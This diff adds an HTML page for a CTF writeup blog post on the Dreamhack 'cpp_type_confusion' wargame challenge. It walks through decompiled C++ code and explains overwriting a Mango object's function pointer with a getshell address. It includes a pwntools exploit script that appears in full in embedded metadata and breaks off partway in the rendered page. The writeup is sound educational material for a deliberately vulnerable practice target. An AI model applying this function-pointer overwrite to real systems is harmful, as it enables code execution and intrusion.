@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack cpp_type_confusion Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다.
+프로그램의 취약점을 찾아 flag를 획득하세요!
+&ldquo;flag&rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+
+This is a cpp challenge so I already know it&rsquo;s going to be a pain.
+Identifying the vulnerabilities
+Usually these days I added the entire decompiled main function but it would clobber the page way too much; So I&rsquo;ll just include the important parts:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/cpp_type_confustion-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/cpp_type_confustion-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/cpp_type_confustion-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack cpp_type_confusion Writeup">
+  <meta property="og:description" content="Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다. 프로그램의 취약점을 찾아 flag를 획득하세요! “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{…} 입니다.
+This is a cpp challenge so I already know it’s going to be a pain.
+Identifying the vulnerabilities Usually these days I added the entire decompiled main function but it would clobber the page way too much; So I’ll just include the important parts:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-08T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack cpp_type_confusion Writeup">
+<meta name="twitter:description" content="Challenge overview
+이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다.
+프로그램의 취약점을 찾아 flag를 획득하세요!
+&ldquo;flag&rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+
+This is a cpp challenge so I already know it&rsquo;s going to be a pain.
+Identifying the vulnerabilities
+Usually these days I added the entire decompiled main function but it would clobber the page way too much; So I&rsquo;ll just include the important parts:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack cpp_type_confusion Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/cpp_type_confustion-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack cpp_type_confusion Writeup",
+  "name": "Dreamhack cpp_type_confusion Writeup",
+  "description": "Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다. 프로그램의 취약점을 찾아 flag를 획득하세요! \u0026ldquo;flag\u0026rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{\u0026hellip;} 입니다.\nThis is a cpp challenge so I already know it\u0026rsquo;s going to be a pain.\nIdentifying the vulnerabilities Usually these days I added the entire decompiled main function but it would clobber the page way too much; So I\u0026rsquo;ll just include the important parts:\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다. 프로그램의 취약점을 찾아 flag를 획득하세요! “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{…} 입니다.\nThis is a cpp challenge so I already know it’s going to be a pain.\nIdentifying the vulnerabilities Usually these days I added the entire decompiled main function but it would clobber the page way too much; So I’ll just include the important parts:\nwhile ( 1 ) { print_menu(); cin\u003e\u003ev17; switch ( v17 ) { case 1: v3 = (Apple *)operator new(0x10u); Apple::Apple(v3); v18 = v3; cout, \"Apple Created!\"); continue; case 2: v5 = (Mango *)operator new(0x10u); Mango::Mango(v5); v19 = v5; cout, \"Mango Created!\"); continue; case 3: if ( appleflag \u0026\u0026 mangoflag ) { applemangoflag = 1; v20 = v19; cout, \"Applemango name: \"); cin, v21); v7 = (const char *)std::string::c_str(v21); strncpy((char *)v20 + 8, v7, 8u); cout, \"Applemango Created!\"); continue; } if ( !appleflag \u0026\u0026 !mangoflag ) { cout, \"You don't have anything!\"); continue; } if ( !appleflag ) goto LABEL_12; if ( !mangoflag ) { cout, \"You don't have mango!\"); } break; case 4: cout, \"1. Apple\\n2. Mango\\n3. Applemango\\n[*] Select : \"); cin, \u0026v17); switch ( v17 ) { case 1: if ( appleflag ) { (**(void (__fastcall ***)(Apple *))v18)(v18); } else { LABEL_12: cout, \"You don't have apple!\"); } break; case 2: if ( mangoflag ) { (**(void (__fastcall ***)(Mango *))v19)(v19); } else { cout, \"you don't have mango!\"); } break; case 3: if ( applemangoflag ) { (**(void (__fastcall ***)(Mango *))v20)(v20); } else { cout, \"you don't have Applemango!\"); } break; default: cout, \"Wrong Choice!\"); break; } break; case 5: cout, \"bye!\"); goto LABEL_30; default: LABEL_30: std::string::~string(v21); return 0; } Keep in mind I cut out about half of the code (the meaningless parts) here. And looking through the function, we also have a getshell one.\nThere are some class constructors that look like so:\n// Alternative name is '_ZN5AppleC2Ev' void __fastcall Apple::Apple(Apple *this) { Base::Base(this); *(_QWORD *)this = \u0026off_401880; strcpy((char *)this + 8, \"Appleyum\"); appleflag = 1; } Yes, classes look like this when decompiled, very much like functions!\nThis will first extend the parent class, Base, initialize the vtable for the class (the first 8 bytes), then copy that string into what I assume to be a char array (the next 8 bytes - first actual use of the class).\nEach class has a vtable that stores pointers to all the functions accessible to it. Then, each object of said class gets a pointer to the class’ vtable, called a vptr.\nLet’s look at mango now:\nvoid __fastcall Mango::Mango(Mango *this) { Base::Base(this); *(_QWORD *)this = \u0026off_401868; *((_QWORD *)this + 1) = mangohi; mangoflag = 1; } This will set the second 8 bytes to mangohi, which is just a function that prints “Mangoyum”.\nWhen we choose to create an “Applemango”, we get to write 8 bytes into a Mango’s + 8; which is a pointer to the mangohi (v20 which is v19 which is v5, Mango object).\nSo we can overwrite that pointer, and call the Mangoyum function which will now be overwritten with the shell. Next time it’s called by “eat”, it will execute what we overwrote mangohi with.\nI whipped up a script really quickly doing exactly this, and it surprisingly worked first try! So let’s connect remotely and get the flag.\nThe exploit from pwn import * elf = ELF('/home/kali/Downloads/dreamhack/cpp_type_confusion/cpp_type_confusion') context.arch = 'amd64' cyberedu = 'host8.dreamhack.games:8735' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() getshell = 0x400FA6 #create apple p.recvuntil(b\": \") p.sendline(b\"1\") #create mango p.recvuntil(b\": \") p.sendline(b\"2\") #create applemango p.recvuntil(b\": \") p.sendline(b\"3\") #send \"name\" p.recvuntil(b\": \") p.sendline(p64(getshell)) #eat applemango p.recvuntil(b\": \") p.sendline(b\"4\") p.recvuntil(b\": \") p.sendline(b\"3\") p.interactive() As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "638",
+  "inLanguage": "en",
+  "datePublished": "2026-05-08T00:00:00Z",
+  "dateModified": "2026-05-08T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/cpp_type_confustion-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack cpp_type_confusion Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-08 00:00:00 +0000 UTC'>May 8, 2026</span>&nbsp;·&nbsp;<span>3 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다.
+프로그램의 취약점을 찾아 flag를 획득하세요!
+&ldquo;flag&rdquo; 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.</p>
+<hr>
+<p>This is a cpp challenge so I already know it&rsquo;s going to be a pain.</p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>Usually these days I added the entire decompiled <code>main</code> function but it would clobber the page way too much; So I&rsquo;ll just include the important parts:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_menu</span>();
+</span></span><span style="display:flex;"><span>    cin<span style="color:#f92672">&gt;&gt;</span>v17;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( v17 )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        v3 <span style="color:#f92672">=</span> (Apple <span style="color:#f92672">*</span>)operator <span style="color:#a6e22e">new</span>(<span style="color:#ae81ff">0x10u</span>);
+</span></span><span style="display:flex;"><span>        Apple<span style="color:#f92672">::</span><span style="color:#a6e22e">Apple</span>(v3);
+</span></span><span style="display:flex;"><span>        v18 <span style="color:#f92672">=</span> v3;
+</span></span><span style="display:flex;"><span>        cout, <span style="color:#e6db74">&#34;Apple Created!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        v5 <span style="color:#f92672">=</span> (Mango <span style="color:#f92672">*</span>)operator <span style="color:#a6e22e">new</span>(<span style="color:#ae81ff">0x10u</span>);
+</span></span><span style="display:flex;"><span>        Mango<span style="color:#f92672">::</span><span style="color:#a6e22e">Mango</span>(v5);
+</span></span><span style="display:flex;"><span>        v19 <span style="color:#f92672">=</span> v5;
+</span></span><span style="display:flex;"><span>        cout, <span style="color:#e6db74">&#34;Mango Created!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( appleflag <span style="color:#f92672">&amp;&amp;</span> mangoflag )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          applemangoflag <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>          v20 <span style="color:#f92672">=</span> v19;
+</span></span><span style="display:flex;"><span>          cout, <span style="color:#e6db74">&#34;Applemango name: &#34;</span>);
+</span></span><span style="display:flex;"><span>          cin, v21);
+</span></span><span style="display:flex;"><span>          v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)std<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span><span style="color:#a6e22e">c_str</span>(v21);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">strncpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v20 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, v7, <span style="color:#ae81ff">8u</span>);
+</span></span><span style="display:flex;"><span>          cout, <span style="color:#e6db74">&#34;Applemango Created!&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>appleflag <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>mangoflag )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          cout, <span style="color:#e6db74">&#34;You don&#39;t have anything!&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>appleflag )
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LABEL_12;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mangoflag )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          cout, <span style="color:#e6db74">&#34;You don&#39;t have mango!&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        cout, <span style="color:#e6db74">&#34;1. Apple</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. Mango</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3. Applemango</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Select : &#34;</span>);
+</span></span><span style="display:flex;"><span>        cin, <span style="color:#f92672">&amp;</span>v17);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> ( v17 )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( appleflag )
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              (<span style="color:#f92672">**</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">***</span>)(Apple <span style="color:#f92672">*</span>))v18)(v18);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>LABEL_12:
+</span></span><span style="display:flex;"><span>              cout, <span style="color:#e6db74">&#34;You don&#39;t have apple!&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( mangoflag )
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              (<span style="color:#f92672">**</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">***</span>)(Mango <span style="color:#f92672">*</span>))v19)(v19);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              cout, <span style="color:#e6db74">&#34;you don&#39;t have mango!&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( applemangoflag )
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              (<span style="color:#f92672">**</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">***</span>)(Mango <span style="color:#f92672">*</span>))v20)(v20);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              cout, <span style="color:#e6db74">&#34;you don&#39;t have Applemango!&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            cout, <span style="color:#e6db74">&#34;Wrong Choice!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        cout, <span style="color:#e6db74">&#34;bye!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_30;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>LABEL_30:
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>string<span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(v21);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Keep in mind I cut out about half of the code (the meaningless parts) here. And looking through the function, we also have a <code>getshell</code> one.</p>
+<p>There are some class constructors that look like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Alternative name is &#39;_ZN5AppleC2Ev&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> Apple<span style="color:#f92672">::</span><span style="color:#a6e22e">Apple</span>(Apple <span style="color:#f92672">*</span>this)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  Base<span style="color:#f92672">::</span><span style="color:#a6e22e">Base</span>(this);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)this <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>off_401880;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)this <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;Appleyum&#34;</span>);
+</span></span><span style="display:flex;"><span>  appleflag <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Yes, classes look like this when decompiled, very much like functions!</p>
+<p>This will first extend the parent class, <code>Base</code>, initialize the <code>vtable</code> for the class (the first 8 bytes), then copy that string into what I assume to be a char array (the next 8 bytes - first actual use of the class).</p>
+<p>Each class has a <code>vtable</code> that stores pointers to all the functions accessible to it. Then, each object of said class gets a pointer to the class&rsquo; <code>vtable</code>, called a <code>vptr</code>.</p>
+<p>Let&rsquo;s look at mango now:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> Mango<span style="color:#f92672">::</span><span style="color:#a6e22e">Mango</span>(Mango <span style="color:#f92672">*</span>this)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  Base<span style="color:#f92672">::</span><span style="color:#a6e22e">Base</span>(this);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)this <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>off_401868;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)this <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> mangohi;
+</span></span><span style="display:flex;"><span>  mangoflag <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This will set the second 8 bytes to <em>mangohi</em>, which is just a function that prints &ldquo;Mangoyum&rdquo;.</p>
+<p>When we choose to create an &ldquo;Applemango&rdquo;, we get to write 8 bytes into a Mango&rsquo;s <code>+ 8</code>; which is a pointer to the <code>mangohi</code> (<code>v20</code> which is <code>v19</code> which is <code>v5</code>, Mango object).</p>
+<p>So we can overwrite that pointer, and call the Mangoyum function which will now be overwritten with the shell. Next time it&rsquo;s called by &ldquo;eat&rdquo;, it will execute what we overwrote <code>mangohi</code> with.</p>
+<p>I whipped up a script really quickly doing exactly this, and it surprisingly worked first try! So let&rsquo;s connect remotely and get the flag.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/cpp_type_confustion-writeup/flag.png#center"></p>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/cpp_type_confusion/cpp_type_confusion&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:8735&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>getshell <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400FA6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#create apple</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#create mango</span>
